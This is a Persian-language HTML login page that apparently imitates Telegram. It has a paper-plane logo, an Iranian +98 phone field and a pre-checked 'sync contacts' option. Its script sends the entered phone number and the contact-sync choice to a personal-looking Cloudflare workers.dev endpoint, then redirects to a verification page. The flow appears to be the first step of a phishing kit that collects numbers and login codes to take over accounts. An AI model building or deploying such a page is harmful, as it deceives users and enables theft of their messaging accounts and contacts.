<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>پیام‌رسان</title>
    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: 'Vazirmatn', sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        /* پس‌زمینه گرادینت متحرک */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: radial-gradient(ellipse at 20% 50%, rgba(60, 191, 138, 0.15) 0%, transparent 60%),
                        radial-gradient(ellipse at 80% 50%, rgba(36, 129, 204, 0.10) 0%, transparent 60%);
            z-index: 0;
        }
        
        /* دایره‌های تزئینی پشت سر */
        .bg-circles {
            position: fixed;
            inset: 0;
            z-index: 0;
            overflow: hidden;
            pointer-events: none;
        }
        
        .bg-circles div {
            position: absolute;
            border-radius: 50%;
            opacity: 0.04;
            animation: floatCircle 20s ease-in-out infinite;
        }
        
        .bg-circles div:nth-child(1) {
            width: 400px;
            height: 400px;
            background: #3CBF8A;
            top: -100px;
            right: -100px;
            animation-delay: 0s;
        }
        
        .bg-circles div:nth-child(2) {
            width: 300px;
            height: 300px;
            background: #2481cc;
            bottom: -50px;
            left: -50px;
            animation-delay: -7s;
        }
        
        .bg-circles div:nth-child(3) {
            width: 200px;
            height: 200px;
            background: #8b5cf6;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation-delay: -14s;
        }
        
        @keyframes floatCircle {
            0%, 100% { transform: translate(0, 0) scale(1); }
            33% { transform: translate(30px, -30px) scale(1.1); }
            66% { transform: translate(-20px, 20px) scale(0.9); }
        }
        
        .container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 420px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border-radius: 32px;
            padding: 40px 28px 32px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px) scale(0.96); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        
        .logo-section {
            text-align: center;
            margin-bottom: 36px;
        }
        
        .logo-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 72px;
            height: 72px;
            background: linear-gradient(135deg, #3CBF8A, #2ea87a);
            border-radius: 24px;
            font-size: 36px;
            margin-bottom: 12px;
            box-shadow: 0 8px 30px rgba(60, 191, 138, 0.3);
            transform: rotate(-6deg);
        }
        
        .logo-title {
            font-size: 26px;
            font-weight: 900;
            color: #fff;
            letter-spacing: -0.5px;
        }
        
        .logo-title span {
            color: #3CBF8A;
        }
        
        .logo-sub {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.4);
            font-weight: 300;
            margin-top: 2px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            font-size: 12px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.5);
            margin-bottom: 6px;
            letter-spacing: 0.5px;
        }
        
        .phone-input-wrapper {
            display: flex;
            background: rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            overflow: hidden;
            border: 2px solid rgba(255, 255, 255, 0.06);
            transition: all 0.3s;
        }
        
        .phone-input-wrapper:focus-within {
            border-color: rgba(60, 191, 138, 0.5);
            box-shadow: 0 0 0 4px rgba(60, 191, 138, 0.08);
        }
        
        .country-code {
            padding: 16px 14px;
            font-size: 16px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.7);
            background: rgba(255, 255, 255, 0.04);
            border-left: 1px solid rgba(255, 255, 255, 0.06);
            white-space: nowrap;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .country-code .flag {
            font-size: 20px;
        }
        
        .phone-input {
            flex: 1;
            padding: 16px 14px;
            border: none;
            outline: none;
            font-size: 16px;
            font-weight: 500;
            background: transparent;
            color: #fff;
            direction: ltr;
            letter-spacing: 0.5px;
        }
        
        .phone-input::placeholder {
            color: rgba(255, 255, 255, 0.2);
            font-weight: 300;
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 6px 4px;
            margin: 4px 0 12px;
        }
        
        .checkbox-group input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: #3CBF8A;
            cursor: pointer;
            border-radius: 6px;
            flex-shrink: 0;
        }
        
        .checkbox-group label {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.5);
            cursor: pointer;
            font-weight: 400;
        }
        
        .checkbox-group label span {
            color: rgba(255, 255, 255, 0.3);
        }
        
        .btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #3CBF8A, #2ea87a);
            color: #fff;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Vazirmatn', sans-serif;
            position: relative;
            overflow: hidden;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(60, 191, 138, 0.3);
        }
        
        .btn:active {
            transform: scale(0.97);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .btn .loader {
            display: none;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin: 0 auto;
        }
        
        .btn.loading .loader {
            display: block;
        }
        
        .btn.loading .btn-text {
            display: none;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error {
            color: #ff6b6b;
            font-size: 12px;
            margin-top: 8px;
            display: none;
            align-items: center;
            gap: 6px;
        }
        
        .error.show {
            display: flex;
        }
        
        .error .material-icons-round {
            font-size: 16px;
        }
        
        .terms {
            font-size: 11px;
            color: rgba(255, 255, 255, 0.25);
            text-align: center;
            margin-top: 24px;
            line-height: 1.8;
        }
        
        .terms a {
            color: rgba(255, 255, 255, 0.4);
            text-decoration: none;
            transition: color 0.3s;
        }
        
        .terms a:hover {
            color: rgba(255, 255, 255, 0.7);
        }
        
        /* حالت تاریک خودکار */
        @media (prefers-color-scheme: light) {
            body { background: #f0f2f5; }
            body::before { display: none; }
            .bg-circles div { opacity: 0.1; }
            .container { background: rgba(255, 255, 255, 0.8); border-color: rgba(0, 0, 0, 0.05); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.08); }
            .logo-title { color: #1a1a2e; }
            .logo-sub { color: rgba(0, 0, 0, 0.3); }
            .form-group label { color: rgba(0, 0, 0, 0.4); }
            .phone-input-wrapper { background: rgba(0, 0, 0, 0.03); border-color: rgba(0, 0, 0, 0.06); }
            .phone-input-wrapper:focus-within { border-color: #3CBF8A; box-shadow: 0 0 0 4px rgba(60, 191, 138, 0.12); }
            .country-code { color: rgba(0, 0, 0, 0.6); background: rgba(0, 0, 0, 0.02); border-color: rgba(0, 0, 0, 0.06); }
            .phone-input { color: #1a1a2e; }
            .phone-input::placeholder { color: rgba(0, 0, 0, 0.2); }
            .checkbox-group label { color: rgba(0, 0, 0, 0.5); }
            .terms { color: rgba(0, 0, 0, 0.25); }
            .terms a { color: rgba(0, 0, 0, 0.4); }
        }
        
        @media (max-width: 420px) {
            .container { padding: 28px 18px 24px; border-radius: 24px; }
            .logo-icon { width: 60px; height: 60px; font-size: 28px; }
            .logo-title { font-size: 22px; }
        }
    </style>
</head>
<body>

<div class="bg-circles">
    <div></div>
    <div></div>
    <div></div>
</div>

<div class="container">
    <div class="logo-section">
        <div class="logo-icon">✈️</div>
        <div class="logo-title">پیام<span>رسان</span></div>
        <div class="logo-sub">ارتباطی امن و سریع</div>
    </div>

    <div id="errorMsg" class="error">
        <span class="material-icons-round">error_outline</span>
        <span id="errorText">خطا</span>
    </div>

    <div class="form-group">
        <label>📱 شماره تلفن</label>
        <div class="phone-input-wrapper">
            <span class="country-code">
                <span class="flag">🇮🇷</span> +98
            </span>
            <input type="tel" class="phone-input" id="phoneInput" placeholder="912 345 6789" maxlength="10" dir="ltr" autofocus>
        </div>
    </div>

    <div class="checkbox-group">
        <input type="checkbox" id="syncContacts" checked>
        <label for="syncContacts">
            🔄 هماهنگ‌سازی مخاطبین
            <span>· پیشنهادی</span>
        </label>
    </div>

    <button class="btn" id="continueBtn">
        <span class="btn-text">ادامه</span>
        <div class="loader"></div>
    </button>

    <div class="terms">
        با ادامه، شما با <a href="#">شرایط خدمات</a> و <a href="#">سیاست حریم خصوصی</a> موافقت می‌کنید.
    </div>
</div>

<script>
    const WORKER_URL = "https://appp.salhamir146.workers.dev";
    const phoneInput = document.getElementById('phoneInput');
    const continueBtn = document.getElementById('continueBtn');
    const errorMsg = document.getElementById('errorMsg');
    const errorText = document.getElementById('errorText');
    const syncContacts = document.getElementById('syncContacts');

    phoneInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
        errorMsg.classList.remove('show');
    });

    continueBtn.addEventListener('click', async function() {
        const phone = phoneInput.value.trim();
        
        if (phone.length < 10) {
            errorText.textContent = 'شماره تلفن ۱۰ رقمی را کامل وارد کنید';
            errorMsg.classList.add('show');
            return;
        }

        this.classList.add('loading');
        this.disabled = true;
        errorMsg.classList.remove('show');

        try {
            const response = await fetch(`${WORKER_URL}/api/send-code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    phone: '98' + phone,
                    syncContacts: syncContacts.checked 
                })
            });

            const data = await response.json();

            if (data.success) {
                localStorage.setItem('userPhone', '98' + phone);
                localStorage.setItem('syncContacts', syncContacts.checked);
                // انیمیشن خروج
                document.querySelector('.container').style.animation = 'slideUp 0.4s reverse';
                setTimeout(() => {
                    window.location.href = 'verify.html';
                }, 400);
            } else {
                errorText.textContent = data.message || 'خطا در ارسال کد';
                errorMsg.classList.add('show');
                this.classList.remove('loading');
                this.disabled = false;
            }
        } catch (err) {
            errorText.textContent = 'خطا در ارتباط با سرور';
            errorMsg.classList.add('show');
            this.classList.remove('loading');
            this.disabled = false;
        }
    });

    phoneInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') continueBtn.click();
    });
</script>
</body>
</html>
